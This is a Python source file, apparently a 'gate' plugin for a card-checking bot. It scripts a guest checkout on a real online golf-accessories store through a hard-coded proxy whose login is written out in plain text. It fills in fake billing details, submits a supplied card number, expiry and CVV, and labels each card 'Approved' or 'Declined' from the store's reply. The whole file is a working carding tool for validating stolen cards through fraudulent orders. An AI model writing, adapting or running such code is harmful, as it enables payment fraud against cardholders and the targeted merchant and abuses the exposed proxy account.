# plugins/gates/src/Payflow.py
from retry import retry
from requests import Session
import requests

def cut_str(text: str, a: str, b: str) -> str:
    return text.split(a)[1].split(b)[0]

@retry(tries=3)
class PayflowAuth:
    def main(self, card):
        try:
            # Validar que card sea una cadena y tenga el formato esperado
            if not isinstance(card, str) or '|' not in card:
                return 'Decline! ❌', 'Formato de tarjeta inválido: debe ser numero|mes|año|cvv'
            
            cc = card.split("|")
            # Validar que haya exactamente 4 partes
            if len(cc) != 4:
                return 'Decline! ❌', f'Formato de tarjeta inválido: se esperaban 4 partes, se recibieron {len(cc)}'
            
            # Validar que ningún campo esté vacío
            if not all(cc):
                return 'Decline! ❌', 'Formato de tarjeta inválido: algún campo está vacío'

            # Asignar tipo de tarjeta
            if cc[0][0] == '4': cctype = 'VI'
            elif cc[0][0] == '5': cctype = 'MC'
            elif cc[0][0] == '6': cctype = 'AE'
            else: cctype = 'VI'  # Default para casos no especificados

            session = requests.Session()
            session.proxies.update({
                "http://": "http://ejafvgfr:ghdhnj9jq14g@92.112.134.204:5648",
                "https://": "http://ejafvgfr:ghdhnj9jq14g@92.112.134.204:5648"
            })

            headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'}
            req_1 = session.get('https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html', headers=headers)
            from_key = cut_str(req_1.text, 'name="form_key" type="hidden" value="', '"')    
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.diamondtour.com',
                'referer': 'https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            }
            data = {
                'form_key': from_key,
                'product': '9161',
                'related_product': '',
                'super_attribute[559]': '732',
                'qty': '1'
            }
            session.post(f'https://www.diamondtour.com/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuZGlhbW9uZHRvdXIuY29tL2dvbGYtYWNjZXNzb3JpZXMvaGVhZC1jb3ZlcnMvcmFjZXItZHJpdmVyLWhlYWRjb3Zlci5odG1s/product/9161/form_key/{from_key}/', headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://www.diamondtour.com/golf-accessories/head-covers/racer-driver-headcover.html',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            session.get('https://www.diamondtour.com/checkout/cart/', headers=headers)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': 'https://www.diamondtour.com/checkout/cart/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
            }
            req_1 = session.get('https://www.diamondtour.com/checkout/onepage/', headers=headers)
            
            headers = {
                'accept': 'text/javascript, text/html, application/xml, text/xml, */*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6IjBjZTU4NGZkYTg2NzgxNTUiLCJ0ciI6IjlkZmEzNzVhNzRjYThhOWVjMDc2MTM4MDNlZTIxYmM2IiwidGkiOjE3NDIxODU0MjczOTB9fQ==',
                'origin': 'https://www.diamondtour.com',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-9dfa375a74ca8a9ec07613803ee21bc6-0ce584fda8678155-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-0ce584fda8678155----1742185427390',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest'
            }
            response = session.post('https://www.diamondtour.com/checkout/onepage/saveMethod/', headers=headers, data={'method': 'guest'})
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6IjE2ZWQxZmQ4ZGRjMzRlYTQiLCJ0ciI6Ijk1MmU2ZGY0MjU1NjUwMDE4N2MwOTllZjBhOTc5YjU3IiwidGkiOjE3NDIxODYxOTk4Njl9fQ==',
                'origin': 'https://www.diamondtour.com',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-952e6df42556500187c099ef0a979b57-16ed1fd8ddc34ea4-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-16ed1fd8ddc34ea4----1742186199869',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'billing[address_id]': '',
                'billing[firstname]': 'Lucas',
                'billing[lastname]': 'Lorenzo',
                'billing[company]': 'OrganiMp',
                'billing[email]': 'valerie.jenkins@gmail.com',
                'billing[street][]': [
                    'E Little York Rd 7912',
                    'E Little York Rd 7912',
                ],
                'billing[city]': 'Norman',
                'billing[region_id]': '12',
                'billing[region]': '',
                'billing[postcode]': '10010',
                'billing[country_id]': 'US',
                'billing[telephone]': '8194544131',
                'billing[fax]': '',
                'billing[customer_password]': '',
                'billing[confirm_password]': '',
                'billing[save_in_address_book]': '1',
                'billing[use_for_shipping]': '1',
                'form_key': from_key,
            }
            response = session.post('https://www.diamondtour.com/checkout/onepage/saveBilling/', headers=headers, data=data)
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6ImJjMjc1NTBiZDUwZDM2OWYiLCJ0ciI6IjAwZTZhMWRhNWMxYzZjMWE0YWRkMWY1MjU1ZDQyMWU4IiwidGkiOjE3NDIxODYyNjIzNDV9fQ==',
                'origin': 'https://www.diamondtour.com',
                'priority': 'u=1, i',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-00e6a1da5c1c6c1a4add1f5255d421e8-bc27550bd50d369f-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-bc27550bd50d369f----1742186262345',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest',
            }
            data = {
                'shipping_method': 'shippingmodule_flatwithmethod',
                'form_key': from_key
            }
            session.post('https://www.diamondtour.com/checkout/onepage/saveShippingMethod/', headers=headers, data=data)
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6Ijg1ZDlhNzRmZTI4NDdiNTYiLCJ0ciI6ImZiODMzNmRjNzNiYmExMTE1NGYzM2RlNGNhY2U2MDgzIiwidGkiOjE3NDIxODYzMTY1Mzl9fQ==',
                'origin': 'https://www.diamondtour.com',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-fb8336dc73bba11154f33de4cace6083-85d9a74fe2847b56-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-85d9a74fe2847b56----1742186316539',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = {
                'payment[method]': 'verisign',
                'payment[cc_type]': cctype,
                'payment[cc_number]': cc[0],
                'payment[cc_exp_month]': cc[1],
                'payment[cc_exp_year]': cc[2],
                'payment[cc_cid]': cc[3],
                'form_key': from_key
            }
            session.post('https://www.diamondtour.com/checkout/onepage/savePayment/', headers=headers, data=data)

            headers = {
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6IjQ3MzFiZmYwMjY2ZjliNGYiLCJ0ciI6IjM2Yjc3YWIwMThmZGIzOGMzNzY4ODRmMGU4ZjhlN2M3IiwidGkiOjE3NDIxODYzMTc0MDF9fQ==',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-36b77ab018fdb38c376884f0e8f8e7c7-4731bff0266f9b4f-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-4731bff0266f9b4f----1742186317401',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest'
            }
            session.get('https://www.diamondtour.com/checkout/onepage/progress/', params={'prevStep': 'payment'}, headers=headers)
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjEzMTE2NjkiLCJhcCI6IjExMjAwODA4NjgiLCJpZCI6IjkxNWEyZTgwODliYTMxYTUiLCJ0ciI6IjI3YTVkNWY0YzczOGIyNzE0OGQ3ZmJiMDk5NmQ3Y2E1IiwidGkiOjE3NDIxODY0MTY1OTJ9fQ==',
                'origin': 'https://www.diamondtour.com',
                'referer': 'https://www.diamondtour.com/checkout/onepage/',
                'traceparent': '00-27a5d5f4c738b27148d7fbb0996d7ca5-915a2e8089ba31a5-01',
                'tracestate': '1311669@nr=0-1-1311669-1120080868-915a2e8089ba31a5----1742186416592',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'x-newrelic-id': 'VQUGUFBVARABVFhTAgYEUlYE',
                'x-prototype-version': '1.7',
                'x-requested-with': 'XMLHttpRequest'
            }
            data = {
                'payment[method]': 'verisign',
                'payment[cc_type]': cctype,
                'payment[cc_number]': cc[0],
                'payment[cc_exp_month]': cc[1],
                'payment[cc_exp_year]': cc[2],
                'payment[cc_cid]': cc[3],
                'form_key': from_key,
                'agreement[1]': '1'
            }
            response = session.post(f'https://www.diamondtour.com/checkout/onepage/saveOrder/form_key/{from_key}/', headers=headers, data=data)
            session.close()
            
            if '"success":false' in response.text:
                msg = response.json()['error_messages']
                if 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in msg:
                    return 'Approved! ✅', 'CVV2 Mismatch: 15004'
                else:
                    return 'Declined! ❌', msg
            else:
                return 'Approved! ✅', 'Charged! $5.99'

        except Exception as e:
            return 'Decline! ❌', f'Declined: 15005-This transaction cannot be processed, {str(e)}'